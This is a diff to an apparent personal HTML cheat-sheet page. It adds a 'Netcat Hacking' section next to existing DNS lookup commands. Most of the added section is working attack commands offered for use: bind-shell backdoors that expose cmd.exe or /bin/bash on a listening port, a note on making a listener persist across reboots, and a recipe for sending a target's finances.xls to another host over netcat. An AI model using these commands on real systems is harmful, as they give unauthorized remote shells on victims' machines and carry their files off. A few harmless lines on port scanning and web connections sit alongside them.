@@ -38,7 +38,24 @@ pre {
   </p>
   <p>DNS lookup<pre>dig @8.8.8.8 brooksmacdonald.com MX</pre></p>
  <p>Reverse DNS lookup<pre>dig -x 212.58.244.26</pre></p>
- </div>     
+ </div>   
+
+<div class="w3-third"> 
+ <p>Netcat Hacking</p>
+ <p>Listen for inbound connections: <pre>nc -l -p <port></pre></p>
+<p>Connect to another machine: <pre>nc options host <ip> <port></pre><p>
+<p>Connect to webserver: <pre>nc 192.168.1.105 80<br>HEAD / HTTP/1.0 </pre></p>
+<p>Listen for connections: <pre>nc -l -p 6996</pre><br>On windows use same command with upper case L to create a persistent listener that survives a reboot</p>
+<p>Create a backdoor: <br>
+   For windows: <pre>nc -l -p 6996 -e cmd.exe <br> nc -nnvl -p 80 -e c:\windows\system32\cmd.exe<\pre></p><br>
+   For Linux: <pre>nc -l -p 6996 -e /bin/bash</pre></p>
+<p>Exfiltrate files from target:<br>
+ On source system: <pre>type finances.xls | nc 192.168.1.104 6996</pre><br>
+On destination system <pre>nc -l -p 6996 > finances.xls</pre></p>
+<p>Scan targets ip addresses for open ports:<br>
+<pre>nc -nv -w1 <ip> <port range></pre></p>
+</div>
+
 <div class="w3-third">  
     <p>
 Useful SQL Scripts
